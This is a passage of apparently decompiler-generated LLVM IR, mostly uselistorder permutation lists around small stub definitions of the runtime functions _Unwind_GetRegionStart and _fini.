328, 168, 245, 130, 329, 52, 338, 339, 340, 169, 341, 342, 343, 344, 170, 171, 131, 345, 132, 346, 95, 347, 348, 349, 172, 350, 351, 173, 174, 352, 96, 353, 97, 354, 355, 175, 356, 357, 176, 177, 358, 133, 359, 98, 360, 178, 179, 180, 361, 362, 134, 99, 363, 364, 181, 365, 366, 367, 182, 183, 0, 135, 368, 100, 369, 370, 371, 184, 372, 373, 185, 186, 1, 136, 374, 101, 375, 102, 376, 377, 378, 379, 187, 380, 381, 188, 189, 382, 383, 137, 384, 2, 385, 103, 386, 138, 387, 388, 389, 390, 190, 391, 392, 191, 192, 393, 394, 139, 395, 3, 396, 104, 397, 140, 398, 193, 194, 195, 399, 400, 141, 105, 401, 402, 403, 404, 196, 405, 406, 197, 198, 143, 407, 142, 408, 106, 409, 107, 410, 412, 413, 414, 415, 416, 145, 417, 146, 418, 199, 419, 71, 420, 200, 201, 147, 421, 144, 422, 108, 423, 109, 424, 202, 53, 437, 203, 54, 438, 204, 55, 439, 205, 56, 440, 206, 57, 441, 207, 87, 58, 442, 443, 208, 59, 444, 209, 60, 445, 210, 61, 446, 211, 62, 447, 212, 63, 448, 449, 451, 496, 497, 498, 499, 500, 505, 213, 506, 507 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 762, 1367, 1368, 587, 1372, 1373, 1374, 1375, 628, 1376, 1377, 546, 562, 629, 1369, 1370, 1371, 1378, 588, 1379, 763, 302, 307, 305, 303, 308, 304, 306, 764, 765, 766, 767, 630, 631, 1380, 1381, 529, 770, 769, 768, 337, 339, 338, 340, 342, 341, 773, 772, 771, 162, 632, 633, 209, 1382, 253, 1383, 776, 775, 774, 149, 1384, 1385, 1386, 1387, 778, 777, 132, 134, 135, 133, 136, 318, 319, 538, 779, 395, 1052, 780, 396, 397, 398, 781, 92, 1053, 1054, 1055, 144, 143, 145, 146, 782, 62, 783, 36, 33, 34, 32, 35, 784, 593, 1025, 50, 51, 49, 48, 47, 1388, 563, 634, 1389, 1, 0, 785, 44, 40, 38, 39, 45, 42, 43, 46, 41, 37, 293, 635, 53, 786, 400, 401, 399, 547, 586, 548, 1311, 1312, 1313, 1314, 564, 787, 402, 789, 788, 403, 404, 1031, 790, 1056, 1057, 1058, 1391, 1060, 1059, 530, 791, 551, 1061, 552, 1392, 1027, 1026, 1393, 553, 1394, 1395, 1396, 1397, 1398, 1399, 987, 1400, 1401, 1402, 1403, 1404, 1405, 988, 755, 793, 792, 405, 409, 411, 407, 406, 408, 410, 412, 414, 413, 1065, 1062, 1063, 1064, 583, 554, 178, 179, 180, 181, 636, 1066, 1067, 1082, 1083, 794, 756, 150, 151, 1074, 989, 1075, 1076, 990, 1077, 1078, 1079, 1080, 1081, 161, 153, 154, 156, 160, 157, 155, 158, 152, 159, 1068, 1069, 1070, 637, 1071, 1072, 1073, 795, 418, 421, 419, 415, 423, 416, 417, 420, 422, 1084, 1085, 1086, 796, 200, 199, 196, 195, 194, 202, 197, 198, 201, 1087, 1088, 1089, 1090, 797, 127, 128, 126, 130, 129, 131, 798, 218, 1029, 638, 1028, 584, 801, 800, 799, 495, 501, 493, 497, 496, 500, 498, 499, 502, 494, 639, 1030, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 555, 802, 504, 503, 505, 508, 506, 507, 509, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 803, 294, 298, 300, 297, 295, 299, 296, 301, 640, 1042, 804, 177, 1091, 1092, 1093, 1094, 1095, 641, 805, 11, 12, 13, 15, 14, 642, 10, 806, 69, 68, 65, 66, 67, 63, 64, 807, 70, 71, 78, 79, 74, 75, 76, 77, 72, 73, 808, 274, 272, 273, 809, 424, 810, 110, 109, 811, 292, 291, 812, 221, 220, 813, 1187, 137, 140, 138, 139, 425, 111, 112, 814, 59, 58, 815, 91, 816, 817, 277, 278, 1406, 1407, 1408, 643, 1409, 1410, 644, 1411, 820, 819, 818, 80, 82, 88, 81, 86, 85, 89, 87, 83, 84, 821, 94, 645, 822, 426, 427, 428, 823, 434, 432, 433, 431, 429, 430, 824, 102, 103, 101, 104, 100, 825, 826, 347, 828, 827, 290, 829, 356, 1360, 832, 831, 830, 141, 142, 833, 96, 98, 97, 99, 556, 834, 90, 523, 531, 1361, 835, 25, 22, 23, 24, 26, 27, 1362, 1363, 1364, 836, 436, 435, 439, 442, 441, 440, 438, 445, 437, 443, 444, 108, 539, 1022, 1023, 1024, 837, 838, 549, 1158, 550, 1159, 1160, 540, 1161, 447, 451, 446, 449, 450, 453, 454, 452, 448, 1162, 1412, 565, 646, 840, 839, 841, 1316, 1319, 1320, 1321, 842, 455, 460, 461, 459, 458, 462, 456, 457, 1322, 1323, 1324, 1325, 843, 467, 473, 466, 472, 471, 465, 475, 474, 469, 463, 468, 464, 470, 1317, 1318, 647, 105, 107, 106, 95, 1300, 648, 1301, 1302, 1303, 1304, 1305, 844, 17, 18, 16, 19, 1326, 148, 147, 1327, 1328, 1329, 1330, 1331, 1332, 594, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 650, 1341, 1342, 1343, 1344, 1345, 649, 1346, 1347, 1348, 1349, 1350, 845, 478, 480, 476, 479, 484, 487, 483, 485, 486, 481, 482, 477, 208, 207, 651, 652, 544, 849, 848, 847, 846, 244, 20, 557, 375, 850, 328, 327, 366, 851, 276, 275, 852, 271, 853, 488, 854, 855, 489, 856, 52, 857, 490, 858, 859, 491, 860, 372, 371, 861, 57, 56, 862, 55, 54, 863, 864, 492, 865, 374, 373, 866, 515, 867, 1214, 1215, 367, 368, 992, 993, 994, 995, 996, 997, 998, 1413, 343, 344, 345, 346, 868, 1188, 653, 115, 116, 1096, 869, 61, 60, 654, 1189, 870, 357, 358, 655, 871, 226, 224, 225, 1190, 872, 30, 29, 28, 873, 370, 369, 874, 875, 205, 204, 876, 203, 877, 510, 878, 359, 879, 164, 163, 880, 93, 882, 881, 191, 192, 884, 883, 265, 266, 165, 524, 1390, 223, 222, 1191, 1192, 1193, 1194, 537, 1195, 886, 885, 125, 124, 119, 122, 120, 121, 117, 118, 123, 2, 1163, 1164, 1165, 1166, 1216, 558, 1217, 559, 1218, 888, 887, 511, 1196, 1197, 1198, 1199, 889, 1307, 1308, 566, 3, 534, 4, 1309, 1097, 1098, 1099, 656, 1200, 512, 1351, 219, 1202, 1201, 1203, 31, 1219, 348, 1234, 890, 352, 351, 350, 349, 1220, 891, 289, 288, 287, 286, 657, 1017, 658, 1018, 595, 1019, 1126, 660, 1127, 1020, 1004, 999, 662, 545, 1000, 1001, 663, 1002, 1003, 667, 1005, 1006, 1007, 664, 1008, 1009, 668, 1010, 1011, 665, 1012, 1013, 666, 661, 1014, 1015, 1016, 669, 670, 1021, 568, 671, 672, 1128, 1129, 1130, 673, 1131, 1132, 1133, 674, 567, 1134, 991, 1137, 1136, 659, 1135, 1138, 1139, 675, 1140, 1141, 1142, 569, 1149, 1150, 541, 676, 904, 903, 902, 901, 900, 899, 898, 897, 896, 895, 894, 893, 892, 323, 324, 326, 325, 322, 320, 321, 1143, 1144, 677, 1145, 1146, 678, 1147, 1148, 313, 312, 311, 317, 314, 315, 316, 310, 309, 679, 680, 906, 905, 513, 514, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 525, 536, 1107, 1108, 570, 526, 1109, 1110, 1111, 1112, 527, 535, 1113, 1114, 571, 528, 1115, 681, 1116, 1117, 682, 1118, 683, 1119, 1120, 560, 1123, 1121, 1122, 532, 533, 1124, 684, 1125, 914, 758, 913, 912, 911, 910, 909, 908, 757, 907, 248, 249, 250, 247, 252, 246, 245, 251, 915, 270, 1292, 577, 561, 916, 242, 241, 240, 239, 243, 237, 235, 234, 236, 238, 1221, 918, 917, 231, 232, 230, 229, 228, 227, 233, 687, 596, 1151, 1152, 597, 1153, 1154, 685, 686, 688, 1155, 1156, 689, 690, 691, 692, 693, 694, 695, 931, 930, 929, 928, 927, 926, 925, 924, 923, 922, 761, 921, 920, 919, 267, 269, 268, 696, 542, 697, 932, 698, 699, 700, 703, 702, 701, 1157, 934, 933, 262, 704, 1167, 582, 1168, 581, 1169, 580, 1170, 579, 1171, 578, 1172, 1173, 705, 585, 706, 1174, 707, 1175, 708, 1176, 709, 1177, 710, 1178, 711, 1179, 712, 1180, 713, 1181, 714, 1182, 715, 1183, 716, 1184, 717, 1185, 718, 1186, 543, 719, 947, 946, 945, 944, 943, 942, 941, 940, 939, 938, 937, 936, 935, 166, 169, 167, 168, 1204, 1210, 6, 572, 1205, 720, 1206, 5, 1207, 589, 1208, 573, 574, 1209, 1211, 1212, 590, 1213, 759, 951, 950, 760, 949, 948, 193, 1293, 598, 599, 1294, 7, 8, 9, 1222, 1223, 1224, 1225, 1226, 591, 592, 721, 1227, 1228, 722, 1229, 1230, 723, 1231, 1233, 1232, 955, 954, 953, 952, 212, 214, 217, 216, 215, 210, 213, 211, 1235, 1236, 1237, 724, 725, 957, 956, 361, 364, 365, 360, 363, 362, 1238, 1239, 1240, 726, 1241, 727, 601, 600, 728, 1242, 958, 331, 334, 335, 336, 333, 329, 332, 330, 1243, 1244, 729, 1245, 602, 575, 730, 959, 263, 264, 1246, 1247, 1248, 731, 1249, 732, 733, 1250, 603, 1251, 960, 255, 259, 260, 261, 258, 254, 257, 256, 1252, 1253, 1254, 734, 1255, 735, 605, 604, 736, 1256, 737, 1257, 961, 185, 188, 189, 190, 187, 182, 186, 183, 184, 1258, 1259, 1260, 1261, 1262, 738, 1263, 739, 1264, 740, 610, 609, 741, 1265, 606, 1266, 607, 1267, 608, 1268, 967, 966, 965, 964, 963, 962, 173, 174, 175, 176, 170, 172, 171, 1269, 1270, 1271, 1272, 1273, 742, 1274, 743, 1275, 744, 619, 618, 745, 1276, 617, 1277, 616, 1278, 611, 1279, 612, 1280, 613, 1281, 614, 1282, 615, 1283, 973, 972, 971, 970, 969, 968, 282, 283, 285, 284, 279, 281, 280, 1284, 1285, 746, 1286, 620, 576, 747, 974, 376, 377, 1287, 1288, 1289, 748, 623, 622, 749, 1290, 621, 1291, 975, 385, 378, 382, 383, 384, 381, 380, 379, 1295, 1296, 1297, 750, 626, 625, 751, 1298, 624, 1299, 980, 979, 978, 977, 976, 386, 387, 392, 393, 394, 391, 390, 389, 388, 1306, 627, 752, 981, 353, 354, 355, 1310, 982, 206, 1315, 983, 21, 1352, 1355, 753, 1356, 1357, 1353, 1354, 1358, 1359, 518, 522, 520, 519, 517, 521, 1365, 754, 984, 113, 1366, 114, 985, 986, 516 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_19aa0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19aa8 = add i32 %tmp1, 72
  %v2_19aa8 = inttoptr i32 %v1_19aa8 to i32*
  %v3_19aa8 = load i32, i32* %v2_19aa8, align 4
  ret i32 %v3_19aa8

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 9, 8, 11, 10, 176, 177, 178, 179, 15, 16, 68, 17, 180, 60, 12, 181, 182, 183, 184, 185, 187, 188, 186, 189, 190, 191, 192, 193, 194, 195, 18, 19, 20, 21, 23, 22, 24, 61, 62, 25, 26, 63, 64, 65, 66, 67, 69, 70, 92, 71, 72, 196, 6, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 3, 130, 131, 132, 133, 134, 27, 135, 153, 28, 29, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 172, 165, 166, 167, 168, 169, 170, 171, 173, 174, 30, 175, 4, 93, 94, 31, 95, 96, 97, 32, 73, 74, 42, 52, 53, 54, 75, 76, 55, 43, 44, 45, 46, 47, 48, 49, 50, 51, 56, 33, 57, 34, 58, 35, 59, 77, 78, 79, 7, 80, 81, 82, 83, 85, 86, 41, 87, 36, 88, 37, 89, 91, 90, 84, 5, 125, 98, 38, 99, 100, 101, 102, 103, 104, 105, 39, 106, 107, 108, 40, 109, 110, 111, 112, 113, 114, 13, 115, 116, 117, 118, 119, 120, 14, 121, 122, 123, 124, 126, 127, 128, 129, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_19abc = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_19abc)
  %v31_19ac4 = load i32, i32* @r0, align 4
  ret i32 %v31_19ac4

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 247, 248, 249, 16, 42, 78, 89, 250, 253, 254, 69, 17, 251, 252, 229, 48, 8, 255, 9, 18, 79, 0, 80, 10, 11, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 1, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 81, 19, 70, 71, 72, 73, 74, 75, 76, 77, 82, 83, 84, 85, 86, 87, 88, 45, 245, 46, 246, 20, 21, 22, 23, 171, 172, 282, 283, 285, 59, 60, 61, 62, 24, 195, 196, 2, 25, 26, 94, 95, 3, 27, 28, 286, 287, 4, 29, 30, 215, 216, 5, 31, 32, 67, 68, 284, 156, 90, 231, 33, 56, 57, 232, 6, 233, 234, 235, 223, 54, 224, 225, 226, 55, 227, 228, 34, 243, 236, 237, 238, 239, 240, 241, 242, 96, 97, 35, 217, 36, 218, 209, 37, 210, 205, 38, 206, 98, 39, 99, 211, 40, 212, 100, 41, 101, 102, 43, 44, 173, 174, 175, 176, 103, 47, 104, 49, 50, 177, 178, 179, 180, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 65, 141, 63, 64, 66, 142, 145, 146, 147, 148, 149, 150, 143, 144, 91, 92, 93, 52, 151, 152, 153, 154, 155, 157, 158, 53, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 181, 182, 183, 184, 185, 186, 187, 12, 188, 189, 190, 191, 192, 193, 194, 219, 220, 7, 197, 198, 199, 200, 201, 202, 203, 204, 207, 208, 213, 214, 221, 222, 230, 244, 58, 51 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 68, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 73, 78, 79, 80, 81, 82, 83, 84, 74, 88, 89, 90, 91, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 39, 75, 76, 77, 85, 86, 87, 40, 41, 42, 0, 36, 37, 38, 43, 47, 48, 44, 45, 46, 92, 30, 31, 32, 33, 34, 35, 59, 60 }
  uselistorder i32 0, { 441, 440, 504, 505, 1407, 445, 444, 506, 1408, 1409, 1410, 1411, 388, 387, 507, 1412, 1413, 210, 1414, 1416, 1417, 153, 154, 1418, 1419, 1415, 97, 98, 99, 100, 2, 1, 3, 0, 199, 198, 200, 201, 202, 1420, 442, 443, 147, 142, 1421, 1422, 204, 205, 203, 206, 1423, 1424, 1425, 1426, 209, 208, 207, 1427, 1428, 1429, 431, 430, 508, 446, 509, 447, 510, 448, 511, 512, 513, 155, 1430, 462, 461, 1431, 1432, 460, 459, 1433, 514, 457, 458, 455, 456, 454, 453, 1434, 452, 451, 450, 449, 395, 1435, 1451, 1436, 213, 1437, 1438, 1439, 1440, 1441, 1442, 215, 1444, 1445, 211, 212, 1446, 1447, 131, 156, 1448, 1449, 705, 101, 102, 432, 433, 214, 1443, 1450, 394, 1452, 515, 516, 1453, 464, 463, 216, 1454, 1455, 217, 1456, 1457, 1458, 113, 517, 518, 1459, 218, 1460, 157, 1461, 1462, 219, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 39, 132, 519, 1473, 220, 1474, 1475, 1476, 4, 1477, 1478, 5, 1479, 1480, 924, 925, 6, 148, 1481, 520, 1482, 838, 839, 840, 841, 842, 846, 843, 844, 845, 7, 396, 103, 847, 521, 848, 849, 850, 465, 466, 926, 927, 8, 522, 783, 523, 1483, 1484, 1485, 9, 10, 158, 159, 160, 1500, 1501, 11, 784, 161, 162, 1318, 1319, 1320, 1321, 221, 222, 1322, 793, 223, 133, 49, 1502, 104, 397, 1506, 1507, 50, 851, 114, 852, 853, 854, 398, 163, 1503, 1504, 1505, 399, 12, 1508, 1509, 1510, 1511, 1512, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1513, 1514, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 40, 1533, 1534, 1535, 1536, 1537, 41, 1538, 1539, 1540, 42, 1541, 1542, 1543, 43, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1568, 1569, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 44, 1587, 1588, 1589, 1590, 1591, 45, 1592, 1593, 1594, 1595, 1596, 46, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 224, 855, 706, 856, 857, 858, 859, 893, 524, 525, 894, 895, 164, 165, 166, 228, 860, 226, 861, 882, 875, 707, 876, 877, 878, 879, 51, 52, 117, 880, 881, 400, 883, 884, 708, 885, 225, 886, 53, 54, 116, 887, 888, 709, 889, 890, 55, 56, 115, 891, 227, 892, 167, 862, 710, 863, 864, 526, 865, 866, 711, 867, 868, 871, 869, 870, 401, 872, 57, 58, 119, 873, 712, 59, 60, 118, 874, 896, 713, 897, 898, 899, 900, 901, 902, 714, 903, 904, 905, 906, 786, 785, 404, 788, 789, 787, 402, 403, 790, 791, 527, 792, 794, 795, 715, 796, 797, 798, 716, 799, 800, 61, 62, 120, 801, 802, 803, 105, 106, 804, 805, 806, 229, 807, 808, 809, 810, 811, 528, 812, 813, 814, 815, 816, 817, 168, 820, 717, 821, 822, 63, 64, 122, 823, 824, 825, 718, 826, 827, 828, 829, 719, 830, 831, 65, 66, 121, 832, 833, 834, 835, 836, 230, 232, 818, 231, 819, 233, 837, 169, 907, 912, 913, 908, 909, 910, 915, 916, 917, 234, 918, 919, 920, 921, 922, 911, 914, 923, 170, 928, 929, 930, 529, 1057, 530, 931, 1486, 1487, 1488, 235, 1489, 1382, 1381, 1326, 1299, 1228, 933, 932, 934, 1058, 1059, 1060, 1612, 1613, 1614, 1615, 236, 1616, 1617, 1618, 1327, 1328, 428, 429, 531, 1623, 723, 1624, 532, 1625, 1626, 533, 1627, 1628, 721, 237, 406, 1629, 722, 1630, 534, 107, 1631, 1632, 535, 1647, 1648, 1651, 720, 405, 1652, 467, 172, 171, 1649, 1650, 1619, 1620, 724, 238, 389, 773, 13, 14, 1643, 1101, 952, 1642, 1277, 1383, 143, 240, 1384, 725, 239, 1385, 1386, 1633, 1634, 1635, 1636, 536, 1637, 173, 1031, 1032, 67, 68, 123, 1387, 1388, 112, 408, 1392, 1389, 1390, 726, 1391, 1393, 727, 1394, 1395, 1396, 1397, 69, 70, 124, 1398, 241, 1399, 1400, 1401, 1403, 1402, 407, 774, 776, 775, 242, 777, 778, 779, 537, 780, 174, 1621, 1622, 1033, 1034, 1035, 1036, 1037, 1038, 244, 175, 1039, 1040, 1041, 144, 243, 1042, 176, 539, 540, 1638, 538, 177, 178, 1334, 1335, 1336, 1337, 1338, 245, 1339, 1340, 1341, 1342, 1343, 1344, 246, 1329, 541, 1330, 1331, 542, 1332, 1333, 179, 728, 247, 248, 1300, 543, 249, 1301, 1302, 1303, 1304, 1305, 258, 255, 250, 254, 251, 257, 256, 259, 253, 252, 1345, 1346, 1370, 1371, 180, 1347, 1348, 263, 261, 262, 1349, 1350, 269, 268, 194, 260, 1351, 1352, 1353, 1354, 1355, 1356, 435, 434, 468, 544, 1357, 1358, 1359, 108, 1360, 265, 264, 266, 267, 193, 1361, 1362, 409, 1363, 1364, 151, 1365, 1366, 1367, 1368, 1369, 15, 16, 953, 954, 109, 17, 469, 545, 1278, 1279, 1281, 1280, 1253, 1252, 1230, 1229, 956, 955, 1043, 957, 958, 1255, 1254, 1256, 960, 959, 1323, 1653, 1654, 125, 181, 1061, 1062, 1063, 270, 935, 936, 182, 271, 1064, 1069, 1070, 1071, 1072, 272, 1065, 273, 1066, 1067, 1073, 1044, 546, 1231, 1639, 1640, 1641, 961, 963, 962, 1074, 964, 1404, 965, 966, 967, 1644, 1645, 1646, 1068, 18, 1490, 1491, 1492, 149, 1493, 1494, 1495, 1496, 1497, 274, 1498, 729, 732, 730, 731, 1499, 733, 195, 275, 1075, 1076, 145, 423, 1077, 1078, 734, 19, 410, 276, 277, 278, 71, 279, 547, 968, 1079, 1080, 1081, 1308, 1307, 1309, 1310, 1311, 1312, 47, 280, 1313, 1314, 1315, 281, 134, 135, 502, 503, 937, 283, 282, 284, 1082, 285, 1083, 1084, 286, 1372, 1373, 548, 287, 1085, 288, 289, 1132, 290, 1102, 976, 969, 293, 970, 971, 549, 972, 550, 765, 753, 754, 739, 755, 740, 756, 757, 741, 758, 742, 759, 743, 760, 744, 761, 762, 136, 72, 392, 393, 763, 745, 764, 766, 767, 768, 769, 770, 291, 292, 771, 772, 973, 735, 974, 551, 975, 412, 411, 977, 978, 979, 980, 295, 294, 981, 982, 983, 746, 390, 984, 126, 127, 391, 985, 128, 129, 552, 987, 988, 736, 989, 990, 991, 992, 993, 553, 994, 995, 996, 424, 196, 738, 997, 998, 999, 1000, 1001, 1002, 737, 1003, 1004, 554, 1005, 555, 1006, 1009, 1010, 1011, 296, 1007, 297, 1008, 298, 986, 938, 939, 940, 138, 73, 941, 137, 74, 942, 943, 556, 944, 557, 945, 558, 946, 947, 949, 299, 300, 948, 425, 75, 130, 436, 950, 301, 20, 951, 1103, 1104, 1012, 559, 1013, 1015, 302, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 304, 303, 1023, 560, 1024, 561, 1025, 562, 1014, 1026, 437, 1029, 563, 1030, 781, 564, 1027, 1028, 565, 309, 308, 747, 183, 311, 310, 748, 184, 313, 312, 749, 185, 315, 314, 750, 186, 317, 316, 751, 187, 752, 307, 306, 305, 414, 426, 415, 416, 417, 418, 566, 1045, 318, 319, 1053, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 413, 1054, 1055, 76, 1056, 320, 567, 146, 1086, 1087, 1088, 1089, 421, 1090, 1091, 1092, 420, 1093, 1094, 1095, 1096, 321, 1097, 1099, 1098, 188, 189, 322, 419, 324, 323, 1100, 325, 326, 110, 327, 330, 1105, 1106, 1107, 1108, 329, 328, 331, 1109, 1110, 77, 78, 197, 150, 332, 111, 569, 1111, 1112, 1113, 1114, 1115, 333, 1116, 1117, 472, 1118, 1119, 1120, 1121, 337, 334, 335, 336, 1122, 1123, 1124, 1125, 570, 1126, 1127, 471, 1128, 568, 1129, 470, 1130, 571, 1131, 339, 1133, 1134, 1135, 1136, 338, 340, 1137, 1138, 79, 80, 139, 1139, 341, 1140, 1141, 475, 1142, 473, 1143, 474, 1144, 345, 1146, 1147, 1148, 1149, 344, 343, 346, 1150, 1151, 81, 82, 1145, 342, 1152, 1153, 347, 1154, 1155, 478, 1156, 477, 1157, 476, 1158, 572, 1159, 574, 140, 83, 1160, 190, 479, 575, 1161, 1162, 348, 349, 1163, 573, 1164, 352, 1165, 1166, 1167, 1168, 351, 350, 353, 1169, 1170, 84, 85, 191, 1171, 1172, 21, 22, 23, 24, 1173, 1174, 354, 481, 1175, 576, 1176, 577, 1177, 578, 1178, 579, 1179, 580, 1180, 581, 1181, 480, 1182, 358, 1184, 1185, 1186, 1187, 356, 355, 359, 1188, 1189, 86, 87, 1183, 357, 1191, 1190, 25, 26, 27, 28, 1192, 360, 1193, 1194, 483, 1195, 582, 1196, 583, 1197, 584, 1198, 585, 1199, 586, 1200, 587, 1201, 482, 1202, 588, 1203, 364, 1205, 1206, 1207, 1208, 362, 361, 365, 1209, 1210, 88, 89, 1204, 363, 1211, 90, 589, 1212, 1214, 1215, 1216, 1217, 590, 1218, 29, 30, 31, 32, 33, 1213, 366, 1219, 1220, 489, 1221, 488, 1222, 487, 1223, 486, 1224, 484, 1225, 485, 1226, 591, 1227, 370, 1233, 1234, 1235, 1236, 368, 367, 371, 1237, 1238, 91, 92, 1232, 369, 1239, 93, 592, 1240, 1242, 1243, 1244, 1245, 593, 1246, 34, 35, 36, 37, 38, 1241, 372, 1247, 1248, 491, 1249, 490, 1250, 594, 1251, 596, 141, 94, 1257, 192, 492, 597, 598, 1258, 1259, 373, 374, 1260, 595, 1263, 1264, 1265, 376, 377, 1266, 1267, 95, 1261, 1262, 375, 1269, 1268, 1270, 378, 1271, 1272, 495, 1273, 494, 1274, 493, 1275, 599, 1276, 1283, 1284, 1285, 380, 381, 382, 1287, 1288, 96, 1286, 1282, 379, 1290, 1291, 1289, 1292, 383, 1293, 1294, 498, 1295, 497, 1296, 496, 1297, 600, 1298, 438, 1306, 1316, 384, 1317, 1324, 385, 1325, 1374, 152, 1375, 1376, 439, 601, 422, 1377, 1378, 48, 427, 1379, 1380, 602, 1405, 386, 1406, 499, 782, 500, 501, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669 }
  uselistorder i32* @r4, { 86, 858, 859, 860, 861, 862, 880, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 10, 877, 878, 879, 881, 882, 883, 884, 885, 886, 887, 888, 93, 94, 95, 96, 139, 11, 140, 141, 142, 12, 143, 144, 145, 146, 147, 148, 149, 0, 13, 150, 151, 152, 153, 154, 155, 156, 157, 216, 217, 889, 87, 88, 89, 891, 892, 893, 5, 896, 61, 890, 777, 778, 97, 98, 99, 100, 101, 102, 103, 104, 105, 897, 898, 158, 159, 14, 4, 160, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 15, 161, 162, 163, 164, 165, 166, 167, 168, 187, 16, 188, 189, 169, 170, 172, 17, 173, 176, 18, 177, 178, 19, 179, 180, 20, 181, 182, 21, 183, 184, 22, 185, 58, 186, 171, 190, 23, 191, 192, 193, 194, 195, 196, 197, 174, 175, 90, 91, 92, 106, 107, 108, 109, 24, 110, 25, 26, 111, 112, 113, 114, 115, 116, 117, 122, 123, 27, 124, 125, 28, 126, 127, 29, 128, 129, 30, 130, 131, 31, 132, 133, 32, 134, 135, 118, 119, 120, 121, 136, 137, 138, 198, 199, 200, 33, 201, 202, 203, 34, 204, 205, 206, 207, 208, 209, 56, 210, 211, 212, 213, 214, 215, 218, 219, 220, 221, 382, 222, 894, 895, 840, 841, 842, 843, 844, 845, 741, 742, 383, 384, 915, 916, 917, 782, 783, 60, 920, 57, 921, 922, 923, 939, 941, 942, 943, 940, 924, 929, 937, 938, 918, 930, 931, 932, 933, 62, 846, 847, 6, 35, 848, 36, 849, 850, 851, 925, 926, 852, 77, 78, 79, 80, 81, 82, 919, 927, 928, 223, 224, 225, 226, 784, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 37, 800, 801, 802, 803, 785, 786, 787, 743, 744, 745, 746, 747, 748, 749, 750, 751, 38, 752, 753, 754, 755, 756, 757, 758, 759, 760, 804, 826, 827, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 59, 818, 819, 1, 820, 821, 822, 823, 824, 825, 246, 247, 248, 709, 710, 711, 712, 713, 716, 717, 718, 714, 715, 665, 666, 667, 668, 669, 670, 671, 616, 617, 618, 621, 622, 623, 619, 620, 249, 250, 251, 252, 253, 254, 255, 256, 257, 672, 673, 674, 675, 676, 677, 678, 63, 258, 259, 260, 261, 262, 263, 385, 386, 387, 388, 389, 390, 391, 227, 228, 229, 392, 393, 394, 395, 9, 396, 397, 398, 399, 400, 401, 402, 264, 265, 266, 269, 270, 271, 267, 268, 272, 273, 274, 275, 276, 277, 934, 935, 936, 278, 279, 280, 403, 404, 405, 406, 407, 281, 282, 283, 284, 285, 286, 287, 288, 466, 467, 425, 426, 75, 76, 289, 290, 291, 292, 66, 67, 64, 65, 68, 69, 70, 71, 72, 73, 74, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 311, 312, 313, 314, 321, 322, 323, 324, 325, 7, 315, 316, 317, 318, 319, 